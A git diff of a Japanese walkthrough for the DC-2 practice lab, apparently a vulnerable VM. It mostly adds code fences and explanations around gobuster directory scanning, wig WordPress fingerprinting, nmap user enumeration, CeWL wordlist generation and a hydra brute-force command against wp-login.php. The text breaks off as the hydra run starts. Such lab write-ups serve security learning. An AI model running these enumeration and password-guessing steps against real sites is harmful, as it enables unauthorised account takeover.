@@ -126,6 +126,7 @@ Webサイトを探索すると、"Flag 1"というページがあり、ヒント
 
 Webサイトに入力欄が無かったので、`GoBuster`ツールを用いて隠されたディレクトリを探索します。
 
+```bash
 ┌─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $gobuster dir -u http://192.168.56.110:80/ -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
@@ -155,6 +156,7 @@ Progress: 4614 / 4615 (99.98%)
 ===============================================================
 Finished
 ===============================================================
+```
 
 `wp-admin`,`wp-includes`,`wp-content`ディレクトリが発見できました。これはWordPressの典型的なディレクトリ構成です。
 
@@ -162,8 +164,9 @@ Finished
 
 ![alt text](../images/login.png)
 
+ユーザーネームやパスワードが分からないので、`wig`というWordPressに対する解析ツールを用います。`wig`を用いることでバージョンを絞り込めます。
 
-
+```bash
 ┌─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $wig $URL
 
@@ -216,6 +219,10 @@ WordPress 4.2.2  2                                                            ht
 __________________________________________________________________________________________________________________
 Time: 6.4 sec    Urls: 387                                                    Fingerprints: 39241      
 
+```
+さらに情報を収集するために、`nmap`を再び用います。`NSE`という機能を用いることでユーザーネームを列挙できます。
+
+```bash
 ┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $sudo nmap -p80 --script http-wordpress-users $IP
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-21 14:30 JST
@@ -232,7 +239,8 @@ PORT   STATE SERVICE
 MAC Address: 08:00:27:0B:F4:E8 (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 3.79 seconds
-
+```
+```bash
 ┌─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $cewl -m 5 -w dict.txt http://dc-2
 CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
@@ -240,6 +248,8 @@ CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
 ┌─[✗]─[user@parrot]─[~/hacking-lab-logs/DC2]
 └──╼ $hydra -L users.txt -P dict.txt dc-2 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:F=incorrect'
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+```
+
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 14:25:07
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 495 login tries (l:3/p:165), ~31 tries per task
